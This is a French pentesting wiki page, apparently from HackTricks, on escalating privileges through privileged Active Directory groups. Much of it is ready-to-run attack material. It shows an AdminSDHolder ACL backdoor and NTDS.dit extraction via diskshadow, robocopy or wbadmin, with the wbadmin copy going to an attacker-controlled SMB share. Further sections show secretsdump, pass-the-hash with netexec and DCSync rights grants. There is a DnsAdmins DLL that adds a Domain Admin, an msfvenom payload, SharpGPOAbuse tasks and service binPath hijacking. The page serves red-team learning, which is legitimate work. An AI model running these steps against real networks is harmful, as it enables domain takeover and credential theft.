# Groupes privilégiés

{{#include ../../banners/hacktricks-training.md}}

## Groupes bien connus disposant de privilèges d’administration

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ce groupe est habilité à créer des comptes et des groupes qui ne sont pas administrateurs du domaine. De plus, il permet la connexion locale au contrôleur de domaine (DC).

Pour identifier les membres de ce groupe, la commande suivante est exécutée :

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

L'ajout de nouveaux utilisateurs est autorisé, tout comme la connexion locale au DC.<sup>[[1]](#references)</sup>

Un chemin conditionnel entre la gestion des comptes et l'accès administrateur local passe par un **groupe ordinaire délégué pour lire le mot de passe LAPS d'un ordinateur**. Vérifiez les droits effectifs d'écriture sur les membres de ce groupe précis, s'il est protégé et si un compte nouveau ou contrôlé peut réellement le rejoindre. Actualisez le jeton du compte avant de tester son autorisation de lecture LAPS sur l'ordinateur cible. Avec Windows LAPS chiffré, l'autorisation de lecture dans l'annuaire et le droit de déchiffrer le mot de passe sont deux exigences distinctes ; l'appartenance à un groupe ou à Account Operators ne suffit à établir ni l'une ni l'autre. Consultez [la portée d'Account Operators selon Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) et [la délégation de Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Groupe AdminSDHolder

La liste de contrôle d'accès (ACL) du groupe **AdminSDHolder** est cruciale, car elle définit les autorisations de tous les « groupes protégés » d'Active Directory, y compris les groupes à privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.

Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder** afin d'accorder des autorisations complètes à un utilisateur standard. Cet utilisateur obtiendrait ainsi le contrôle total de tous les groupes protégés. Si ses autorisations sont modifiées ou supprimées, elles seront automatiquement rétablies dans l'heure en raison de la conception du système.<sup>[[14]](#references)</sup>

La documentation récente de Windows Server considère toujours plusieurs groupes d'opérateurs intégrés comme des objets **protégés** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Par défaut, le processus **SDProp** s'exécute toutes les 60 minutes sur le **PDC Emulator**, définit `adminCount=1` et désactive l'héritage sur les objets protégés. Cela peut servir à la persistance, mais aussi à repérer les utilisateurs privilégiés obsolètes qui ont été retirés d'un groupe protégé, mais conservent leur ACL sans héritage.<sup>[[12]](#references)</sup>

Commandes permettant d'examiner les membres et de modifier les autorisations :

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Un script est disponible pour accélérer le processus de restauration : [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Pour plus de détails, consultez [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## Corbeille AD

La visibilité des objets supprimés est contrôlée par les autorisations effectives sur l’annuaire ; le nom d’un groupe ne prouve pas à lui seul que l’identité actuelle peut répertorier ou restaurer un objet. La Corbeille AD doit avoir été activée avant la suppression pour permettre une restauration complète. Une restauration exige également le droit Reanimate-Tombstones sur la racine du contexte de nommage, des droits de renommage et le droit CREATE_CHILD sur le conteneur de destination. Les [recommandations de Microsoft sur la Corbeille](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) et les [règles d’autorisation de suppression](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) distinguent ces conditions. Une identité autorisée à lire les objets supprimés peut examiner des enregistrements susceptibles de révéler des informations sensibles :

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Cela est utile pour **retrouver d’anciens chemins de privilèges**. Les objets supprimés peuvent encore exposer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, d’anciens SPN ou le DN d’un groupe privilégié supprimé, qu’un autre opérateur pourra restaurer ultérieurement.

Les attributs définis par l’application peuvent également conserver d’anciens éléments d’identification tant qu’un objet reste à l’état supprimé. Traitez cela comme une piste distincte à examiner : l’identité actuelle doit être autorisée à énumérer l’objet supprimé **et** à lire cet attribut, la valeur doit être un élément d’identification utilisable, et un principal toujours actif doit l’accepter. L’appartenance à un groupe ou le seul nom d’un compte supprimé ne prouve aucune de ces étapes ; évitez d’afficher les valeurs d’identification lors d’une énumération de routine. [La documentation de Microsoft sur la Corbeille](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) décrit la conservation des attributs après suppression.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Réanimer un compte supprimé via des ACL déléguées

Un résultat `WRITE` d’un outil ACL pour un compte supprimé est une piste, pas la preuve que toutes les autorisations de restauration sont effectives.<sup>[[18]](#references)</sup> Inspectez directement l’ACL de l’objet supprimé et son attribut `lastKnownParent` ; les chemins BloodHound peuvent omettre les ACL des objets supprimés.<sup>[[19]](#references)</sup> Un compte restauré peut conserver son hash de mot de passe, mais sa restauration ne révèle pas le mot de passe et n’accorde pas de droits de réinitialisation du mot de passe. L’authentification nécessite toujours un identifiant valide.<sup>[[19]](#references)</sup>

Pour énumérer les comptes supprimés masqués et confirmer le droit de réanimation depuis Linux, utilisez `bloodyAD` avec les contrôles LDAP pour les objets recyclés et les liens désactivés. Restaurez ensuite le compte choisi à l’aide de son `sAMAccountName`. Remplacez le domaine, l’hôte et l’identité de l’exemple par ceux de l’environnement évalué ; vérifiez le DN cible et `lastKnownParent` avant l’écriture.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Accès au contrôleur de domaine

L’accès aux fichiers du DC est restreint, sauf si l’utilisateur fait partie du groupe `Server Operators`, ce qui modifie son niveau d’accès.

### Privilege Escalation

Avec `PsService` ou `sc` de Sysinternals, il est possible d’inspecter et de modifier les permissions des services. Le groupe `Server Operators`, par exemple, dispose d’un contrôle total sur certains services, ce qui permet d’exécuter des commandes arbitraires et d’obtenir une élévation de privilèges :<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Cette commande révèle que `Server Operators` disposent d’un accès complet, ce qui leur permet de manipuler les services pour obtenir des privilèges élevés.

## Backup Operators

L’appartenance à `Backup Operators` peut accorder `SeBackupPrivilege` et `SeRestorePrivilege` sur un hôte, selon sa stratégie locale et la session de connexion. Vérifiez le **jeton effectif du processus qui exécute les commandes** avec `whoami /groups` et `whoami /priv` : l’appartenance au groupe ne prouve pas à elle seule que `SeBackupPrivilege` est présent et activé. Si le privilège est présent mais désactivé, il peut être activé dans ce jeton ; s’il est absent ou supprimé, ces opérations de sauvegarde ne peuvent pas l’utiliser. `SeBackupPrivilege` permet les **lectures** protégées via des API prenant en charge les opérations de sauvegarde (par exemple, `FILE_FLAG_BACKUP_SEMANTICS` ou `robocopy /B`) ; `SeRestorePrivilege` est un privilège distinct pour les opérations de restauration et d’écriture. Les listings de répertoires et les copies ordinaires n’utilisent pas nécessairement la sémantique de sauvegarde.<sup>[[1]](#references)</sup>

Pour lister les membres du groupe, exécutez :

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Attaque locale

Sur un hôte où le jeton effectif dispose de `SeBackupPrivilege`, la copie suivante, qui tient compte des privilèges de sauvegarde, peut lire un fichier protégé :

1. Importer les bibliothèques nécessaires :

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Si le privilège est présent mais désactivé, activez-le et vérifiez son état dans ce processus :

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Copier un fichier depuis un répertoire à accès restreint, par exemple :

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Attaque AD

`NTDS.dit` est la base de données Active Directory d’un **contrôleur de domaine (DC)**. Cette méthode nécessite un token adapté sur le DC et l’accès au volume contenant la base de données ; l’appartenance au groupe Backup Operators sur une autre machine ne donne pas accès à un DC particulier. Une base de données active est généralement verrouillée : utilisez donc une shadow copy accessible ou un autre mécanisme de sauvegarde avant de la copier. La création ou l’exposition d’une shadow copy dépend aussi de la configuration VSS de l’hôte et des droits de l’appelant. L’exemple ci-dessous suppose que le DC stocke `NTDS.dit` sur `C:` dans `\Windows\NTDS` ; adaptez le volume et le chemin si ce n’est pas le cas.

#### Utilisation de diskshadow.exe

1. Si vous y êtes autorisé, créez et exposez une shadow copy du lecteur `C:` du DC en tant que `F:` :

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copier `NTDS.dit` depuis la copie fantôme :

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Vous pouvez également utiliser `robocopy` pour copier des fichiers :

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Enregistrez la ruche `SYSTEM` du DC pour une extraction hors ligne. `SAM` est la base de données des comptes locaux sur les systèmes membres ; la ruche `SAM` d’un DC ne remplace pas `NTDS.dit` et ne fournit pas le hash de l’Administrator du domaine :

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Transférez `ntds.dit` et `SYSTEM.SAV` vers l’hôte d’analyse et extrayez les hashes des comptes du domaine. Une ruche `SAM` sauvegardée depuis un système membre, accompagnée de la ruche `SYSTEM` correspondante, permet d’obtenir les hashes des comptes locaux :

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Si un hash d’Administrator de **domaine** a été récupéré depuis `NTDS.dit`, il peut être testé pour l’authentification au domaine. Un hash d’Administrator local provenant de `SAM.SAV` est un identifiant différent et ne permet pas de s’authentifier en tant qu’Administrator du domaine.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Utilisation de wbadmin.exe

1. Configurer un système de fichiers NTFS pour le serveur SMB sur la machine de l’attaquant et mettre en cache les identifiants SMB sur la machine cible.
2. Utiliser `wbadmin.exe` pour effectuer une sauvegarde du système et extraire `NTDS.dit` :
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Pour une démonstration pratique, consultez [VIDÉO DE DÉMONSTRATION AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec les privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des contrôleurs de domaine. Cette capacité offre un important potentiel d’exploitation.

Pour lister les membres du groupe DnsAdmins, utilisez :

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Exécuter une DLL arbitraire (CVE‑2021‑40469)

> [!NOTE]
> Cette vulnérabilité permet d’exécuter du code arbitraire avec des privilèges SYSTEM dans le service DNS (généralement sur les DC). Ce problème a été corrigé en 2021.

Les membres peuvent faire charger au serveur DNS une DLL arbitraire (localement ou depuis un partage distant) à l’aide de commandes telles que :

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Le redémarrage du service DNS (qui peut nécessiter des autorisations supplémentaires) est nécessaire pour que la DLL soit chargée :

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Pour plus de détails sur ce vecteur d’attaque, consultez ired.team.

#### Mimilib.dll

Il est également possible d’utiliser mimilib.dll pour exécuter des commandes, en la modifiant pour exécuter des commandes spécifiques ou des reverse shells. [Consultez cet article](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d’informations.<sup>[[15]](#references)</sup>

### Enregistrement WPAD pour MitM

Les DnsAdmins peuvent manipuler les enregistrements DNS pour mener des attaques Man-in-the-Middle (MitM), en créant un enregistrement WPAD après avoir désactivé la liste globale de blocage des requêtes. Des outils comme Responder ou Inveigh peuvent être utilisés pour usurper des identités et capturer le trafic réseau.

### Event Log Readers
Les membres peuvent accéder aux journaux des événements et y trouver potentiellement des informations sensibles, telles que des mots de passe en texte clair ou des détails sur l’exécution de commandes :

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Permissions Windows Exchange

Ce groupe peut modifier les DACL de l’objet de domaine, ce qui peut permettre d’obtenir des privilèges DCSync. Les techniques d’escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Si vous pouvez agir en tant que membre de ce groupe, l’abus classique consiste à accorder à un principal contrôlé par un attaquant les droits de réplication nécessaires à [DCSync](dcsync.md) :

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historiquement, **PrivExchange** combinait l’accès aux boîtes mail, la coercition de l’authentification Exchange et le relais LDAP pour obtenir ce même accès. Même lorsque cette voie de relais est atténuée, l’appartenance directe à `Exchange Windows Permissions` ou le contrôle d’un serveur Exchange reste une voie à haut risque vers les droits de réplication du domaine.

## Hyper-V Administrators

Les membres de Hyper-V Administrators disposent d’un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle de Domain Controllers virtualisés. Cela comprend le clonage de DC en cours d’exécution et l’extraction de hashes NTLM du fichier NTDS.dit.

### Exemple d’exploitation

En pratique, l’abus consiste généralement à **accéder hors ligne aux disques ou aux points de contrôle des DC**, plutôt qu’à utiliser les anciennes techniques de LPE au niveau de l’hôte. Avec un accès à l’hôte Hyper-V, un opérateur peut créer un point de contrôle ou exporter un Domain Controller virtualisé, monter le VHDX et extraire `NTDS.dit`, `SYSTEM` et d’autres secrets sans toucher à LSASS dans la machine virtuelle :

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Depuis là, réutilisez le workflow `Backup Operators` pour copier `Windows\NTDS\ntds.dit` et les ruches du registre hors ligne. Workflow de fichiers de sauvegarde associé :

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Ce groupe permet à ses membres de créer des stratégies de groupe dans le domaine. Cependant, ses membres ne peuvent pas appliquer de stratégies de groupe aux utilisateurs ou aux groupes, ni modifier les GPO existantes.

La nuance importante est que le **créateur devient propriétaire de la nouvelle GPO** et obtient généralement suffisamment de droits pour la modifier ensuite. Cela rend ce groupe intéressant si vous pouvez :

- créer une GPO malveillante et convaincre un administrateur de la lier à une OU ou à un domaine cible
- modifier une GPO que vous avez créée et qui est déjà liée à un emplacement utile
- abuser d’un autre droit délégué permettant de lier des GPO, tandis que ce groupe vous donne les droits nécessaires pour les modifier

En pratique, l’abus consiste généralement à ajouter une **tâche immédiate**, un **script de démarrage**, une **appartenance au groupe des administrateurs locaux** ou une modification de l’**attribution des droits utilisateur** au moyen de fichiers de stratégie stockés dans SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Si vous modifiez manuellement la GPO via `SYSVOL`, rappelez-vous que cette modification ne suffit pas à elle seule : `versionNumber`, `GPT.ini` et parfois `gPCMachineExtensionNames` doivent également être mis à jour, sinon les clients ignoreront l’actualisation de la stratégie.<sup>[[9]](#references)</sup>

## Organization Management

Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial appelé **Organization Management** dispose de capacités importantes. Ce groupe dispose des privilèges nécessaires pour **accéder aux boîtes mail de tous les utilisateurs du domaine** et conserve le **contrôle total de l’unité organisationnelle (OU) « Microsoft Exchange Security Groups »**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour une élévation de privilèges.

### Exploitation des privilèges et commandes

#### Print Operators

Les membres du groupe **Print Operators** disposent de plusieurs privilèges, dont **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un contrôleur de domaine**, de l’arrêter et de gérer les imprimantes. Pour exploiter ces privilèges, notamment si **`SeLoadDriverPrivilege`** n’est pas visible dans un contexte sans élévation, il est nécessaire de contourner le contrôle de compte d’utilisateur (UAC).<sup>[[1]](#references)</sup>

Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée :

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Sur les contrôleurs de domaine, ce groupe est dangereux, car la stratégie par défaut des contrôleurs de domaine accorde **`SeLoadDriverPrivilege`** à `Print Operators`. Si vous obtenez un jeton élevé pour un membre de ce groupe, vous pouvez activer ce privilège et charger un pilote signé mais vulnérable pour obtenir un accès au noyau/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Pour en savoir plus sur la gestion des jetons, consultez [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Les membres de ce groupe se voient accorder l’accès aux PC via le Remote Desktop Protocol (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Des informations supplémentaires sur l’exploitation de RDP sont disponibles dans des ressources dédiées au pentesting.

#### Remote Management Users

Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L’énumération de ces membres s’effectue avec :

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Pour les techniques d’exploitation liées à **WinRM**, il convient de consulter la documentation correspondante.

#### Server Operators

Ce groupe dispose des autorisations nécessaires pour effectuer diverses configurations sur les contrôleurs de domaine, notamment les privilèges de sauvegarde et de restauration, la modification de l’heure système et l’arrêt du système.<sup>[[1]](#references)</sup> Pour énumérer ses membres, la commande indiquée est :

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Sur les contrôleurs de domaine, les `Server Operators` héritent souvent de suffisamment de droits pour **reconfigurer des services ou les démarrer/arrêter**, et disposent également de `SeBackupPrivilege`/`SeRestorePrivilege` via la stratégie par défaut des DC. En pratique, cela en fait un pont entre **l’abus du contrôle des services** et **l’extraction de NTDS** :

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

L'impossibilité d'énumérer les services n'exclut pas l'accès à un **service connu**. Le Service Control Manager vérifie séparément `SC_MANAGER_ENUMERATE_SERVICE` pour l'énumération et `SC_MANAGER_CONNECT` pour la connexion ; l'ouverture d'un service nommé vérifie ses propres droits, notamment `SERVICE_CHANGE_CONFIG` et `SERVICE_START`. Examinez le jeton effectif et l'ACL de ce service même si une commande générale `sc.exe query` échoue. Les droits de configuration seuls ne constituent qu'une piste : l'identité du service, les droits de démarrage et d'arrêt, ainsi qu'un déclencheur utilisable déterminent aussi si une transition vers des privilèges supérieurs est possible. Consultez la [référence de Microsoft sur les droits d'accès aux services](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Si l'ACL d'un service accorde à ce groupe les droits de modification et de démarrage, configurez le service pour exécuter une commande arbitraire, démarrez-le en tant que `LocalSystem`, puis restaurez son `binPath` d'origine. Si le contrôle des services est verrouillé, repliez-vous sur les techniques `Backup Operators` ci-dessus pour copier `NTDS.dit`.

## References

- [1] [ired.team – Comptes privilégiés et privilèges de jeton](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abus de SeLoadDriverPrivilege pour l'escalade de privilèges](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abus des permissions GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abus des GPO, partie 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Guide d'un red teamer sur les GPO et les OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Fonction ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB : Baby — LDAP anonyme → password spray → SeBackupPrivilege → administrateur de domaine](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Annexe C : comptes et groupes protégés dans Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Comment abuser d'AdminSDHolder et y installer une porte dérobée pour obtenir une persistance d'administrateur de domaine](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abus du privilège DnsAdmins pour l'escalade dans Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informations sur l'abus de l'arête GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Fonction NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Règles d'autorisation de suppression réversible](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB : Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
